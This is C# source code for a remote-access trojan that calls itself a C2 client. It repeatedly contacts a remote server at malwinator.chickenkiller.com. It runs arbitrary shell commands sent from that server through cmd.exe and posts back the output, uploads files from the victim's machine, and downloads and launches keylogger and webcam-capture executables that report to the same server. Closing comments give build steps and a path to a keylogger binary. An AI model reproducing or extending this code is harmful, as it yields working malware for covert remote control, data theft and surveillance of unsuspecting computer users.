using System.Diagnostics;
using System.Management;
using System.Net.Http.Headers;

namespace C2
{
    class Program
    {
        private static string requestResult = string.Empty;
        //private static Uri url = new Uri("https://malwinator.chickenkiller.com");
        private static Uri url = new Uri("http://malwinator.chickenkiller.com");
        //private static Uri url = new Uri("http://localhost:5000");
        //private static Uri url = new Uri("http://10.11.97.215:5000");
        private static string machineName = Environment.MachineName; 
        private static Process process = new Process();
        private static string processName = string.Empty;
        private static string keyloggerPath = string.Empty;
        private static string cameraPath = string.Empty;

        // adding the post data to the request (name=machineName)
        private static KeyValuePair<string, string> machineNameFormData = new KeyValuePair<string, string>("name", machineName);

        private static HttpClient server = new HttpClient();

        static void Main(string[] argv)
        {
            
            server.Timeout = TimeSpan.FromDays(1);

            while (true)
            {
                // each 15 seconds the program will try to connect to the remote server
                bool connectionSuccess = false;
                while (!connectionSuccess)
                {
                    Thread.Sleep(1000 * 5);
                    try
                    {
                        requestResult = server.PostAsync(url + "/handshake", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                        Console.WriteLine(requestResult);
                        connectionSuccess = true;
                    }
                    catch
                    {
                        Console.WriteLine("[X] Connection Refused!");
                    }

                }

                // make the connection, if the connection fails it gets back to trying the connection
                bool readySuccess = true;
                while (readySuccess)
                {
                    try
                    {
                        requestResult = server.PostAsync(url + "/ready", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                        ManageCommand(requestResult);
                        readySuccess = true;
                    }
                    catch
                    {
                        Console.WriteLine("[!] Connection Ended!");
                        readySuccess = false;
                    }
                }
            }
        }

        static async void ManageCommand(string command)
        {
            string[] args = command.Trim().Split(' ');


            switch (args[0])
            {
                case "ping":
                    requestResult = server.PostAsync(url + "/pong", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                    Console.WriteLine(requestResult);
                    break;

                case "download":
                    /*
                        A download command looks like this:
                            download -k -r file_location 
                            (This means that we want to reset the keylogger's current location held by the virus, this command won't upload the file)
                            
                            download -k file_location 
                            (This command will upload a file and it will mark the location as the keylogger location)
                            
                            download file_location 
                            (This command only uploads a file)
                            
                            Same functionality for -c (insead of -k) flag which indicates that we are working with the camera module.
                     */

                    int skipped = 1;
                    string moduleFlag = args.Skip(skipped).First();
                    string resetFlag = args.Skip(skipped + 1).First();
                    string downloadStatus = string.Empty;

                    if (moduleFlag[0] == '-')
                    {
                        skipped++;

                        if (resetFlag[0] == '-')
                            skipped++;
                    }

                    string[] files = string.Join(" ", args.Skip(skipped)).Split("\"")
                        .Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();

                    string fullPath = string.Empty;
                    
                    if (files.Length == 1)
                        fullPath = files[0];
                    else
                        fullPath = files[1] + "\\" + files[0];

                    Console.WriteLine(fullPath);

                    if (moduleFlag == "-k")
                    {
                        keyloggerPath = fullPath;
                        downloadStatus = $"Keylogger uploading at: {keyloggerPath}";
                        Console.WriteLine(downloadStatus);
                    }
                    else if (moduleFlag == "-c")
                    {
                        cameraPath = fullPath;
                        downloadStatus = $"Camera uploading at: {cameraPath}";
                        Console.WriteLine(downloadStatus);
                    }


                    if (skipped != 3)
                    {
                        // this is were the file get's downloaded
                        KeyValuePair<string, string> fileFormData = new KeyValuePair<string, string>("file", files[0]);

                        using (HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result)
                        {
                            

                            // Check if the request was successful
                            if (response.IsSuccessStatusCode)
                            {
                                // Save the file content to a local file
                                try
                                {
                                    using (FileStream fileStream = new FileStream(fullPath, FileMode.Create))
                                    {
                                        if (fileStream.CanWrite)
                                        {
                                            await response.Content.CopyToAsync(fileStream);
                                            downloadStatus = "File uploaded successfully! Path: " + fullPath;
                                        }
                                        else
                                        {
                                            downloadStatus = $"Failed to download file: Cannot write to location.";
                                        }
                                
                                    }
                                }
                                catch (Exception ex)
                                {
                                    downloadStatus = $"Failed to download filed: {ex.Message}";
                                }

                            }
                            else
                            {
                                // Display the status code and reason phrase
                                downloadStatus = $"Failed to download file: {response.StatusCode} {response.ReasonPhrase}";
                                Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
                            }
                        }
                    }

                    KeyValuePair<string, string> fileDownloadResult = new KeyValuePair<string, string>("result", downloadStatus);
                    HttpResponseMessage r = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileDownloadResult, machineNameFormData })).Result;
                    await Console.Out.WriteLineAsync(r.Content.ToString());

                    break;

                case "upload":
                    string filePath = string.Join(" ", args.Skip(1)).Trim('\"');
                    string uploadStatus = string.Empty;

                    if (File.Exists(filePath))
                    {
                        try
                        {
                            using (var content = new MultipartFormDataContent())
                            using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                            {
                                var fileContent = new StreamContent(fileStream);
                                fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("multipart/form-data");
                                content.Add(fileContent, "file", Path.GetFileName(filePath));

                                var response = await server.PostAsync(url + "/upload", content);

                                if (response.IsSuccessStatusCode)
                                {
                                    uploadStatus = $"File uploaded successfully on the server!";
                                    Console.WriteLine(uploadStatus);
                                }
                                else
                                {
                                    uploadStatus = $"Failed to upload the file {filePath}!";
                                    Console.WriteLine(uploadStatus);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            uploadStatus = $"An error occurred: {ex.Message}";
                            Console.WriteLine(uploadStatus);
                        }
                    }
                    else
                    {
                        uploadStatus = $"File not found! {filePath}";
                        Console.WriteLine(uploadStatus);
                    }

                    KeyValuePair<string, string> fileUploadResult = new KeyValuePair<string, string>("result", uploadStatus);
                    HttpResponseMessage resp = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileUploadResult, machineNameFormData })).Result;
                    await Console.Out.WriteLineAsync(resp.Content.ToString());
                    
                    break;
                    
                case "log":
                    string message = string.Empty;

                    // Start the process
                    try
                    {

                        if (!processName.Equals(string.Empty))
                        {
                            Console.WriteLine("[!] Process already started! " + "(" + processName + ")");
                            throw new Exception($"Process already started! ({processName})");
                        }

                        // this post request is to clear the log buffer from the server
                        await server.PostAsync(url + "/clearLog", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData }));

                        if (!File.Exists(keyloggerPath))
                        {
                            Console.WriteLine("[!] File not provided for keylogger!");
                            throw new Exception("File not provided for keylogger!");
                        }
                        process.StartInfo.FileName = keyloggerPath; // Path to the keylogger executable file
                        process.StartInfo.Arguments = url.ToString(); // Command-line arguments


                        if (process.Start())
                        {
                            // the process should start and send a success response to the server
                            Console.WriteLine($"[+] Process started! PID: {process.Id}");
                            message = "Process started!\n";
                            processName = "keylogger";
                        }
                        else
                            throw new Exception("Process could not be started!"); // error is thrown to be cought 
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"Error: {e.Message}");
                        message = $"Error: {e.Message}";
                    }
                    
                    // here the client should send a fail response to the server
                    await server.PostAsync(url + "/log", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> {
                        machineNameFormData,
                        new KeyValuePair<string, string>("key", '\n' + message + '\n')
                     }));
                    break;


                case "camera":

                    if (!processName.Equals(string.Empty))
                    {
                        Console.WriteLine("[!] Process already started! " + "(" + processName + ")");
                        return;
                    }

                    if (!File.Exists(cameraPath))
                    {
                        Console.WriteLine("[!] File not provided for camera!");
                        return;
                    }
                    process.StartInfo.FileName = cameraPath; // Path to the keylogger executable file
                    process.StartInfo.Arguments = url.ToString(); // Command-line arguments


                    if (process.Start())
                    {
                        // the process should start and send a success response to the server
                        Console.WriteLine($"[+] Process started! PID: {process.Id}");
                        message = "Process started!\n";
                        processName = "camera";
                    }

                    break;

                case "end":

                    if (args[1] == "log")
                    {
                        if (processName == "keylogger")
                        {
                            process.Kill();
                            Console.WriteLine($"[+] Process {process.Id} killed!");
                            processName = string.Empty;
                        }

                    }
                    else if (args[1] == "camera")
                    {
                        if (processName == "camera")
                        {
                            TerminateProcessAndChildren(process);
                            
                            Console.WriteLine($"[+] Process {process.Id} killed!");
                            processName = string.Empty;
                        }
                    }
                    else if (args[1] == "connection")
                    {
                        Environment.Exit(0);
                    }

                    break;


                case "shell":
                    KeyValuePair<string, string> result = new KeyValuePair<string, string>("result", ExecuteCommand(string.Join(" ", args.Skip(1))));

                    using (HttpResponseMessage response = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { result, machineNameFormData })).Result)
                    {
                        Console.WriteLine(response.Content.ToString());
                    }

                    Console.WriteLine("[+] Shell command sent! (" + string.Join(" ", args.Skip(1)) + ")");
                    break;

                default:
                    Console.WriteLine("[!] Command not recognized! (" + command + ")");
                    break;
            }
        }

        private static string ExecuteCommand(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/C \"{command}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process process = new Process
            {
                StartInfo = startInfo
            };

            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string err = process.StandardError.ReadToEnd();

            process.WaitForExit();
            int code = process.ExitCode;

            if (code == 0)
                return output;
            else
                return err;
        }

        static void TerminateProcessAndChildren(Process parent)
        {
            // Retrieve all child processes of the main process
            List<Process> children = GetChildProcesses(parent);

            // Terminate all child processes recursively
            foreach (Process child in children)
            {
                TerminateProcessAndChildren(child);
            }

            // Kill the main process
            parent.Kill();
        }

        static List<Process> GetChildProcesses(Process parent)
        {
            List<Process> children = new List<Process>();

            // Get all processes running on the system
            Process[] allProcesses = Process.GetProcesses();

            // Find child processes of the main process
            foreach (Process process in allProcesses)
            {
                // Check if the parent process ID of the process matches the main process ID
                if (GetParentProcessId(process) == parent.Id)
                {
                    children.Add(process);
                }
            }

            return children;
        }

        static int GetParentProcessId(Process process)
        {
            try
            {
                using (ManagementObject mo = new ManagementObject("win32_process.handle='" + process.Id + "'"))
                {
                    mo.Get();
                    return Convert.ToInt32(mo["ParentProcessId"]);
                }
            }
            catch
            {
                return -1; // Return -1 if unable to get the parent process ID
            }
        }
    }
}

// useful commands
// dotnet publish -c Release
// executable path: bin\Release\net8.0\win-x64\publish\
// C:\Users\vlads\Downloads\keylogger.exe
// C:\Users\vlads\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe --onefile .\sender.py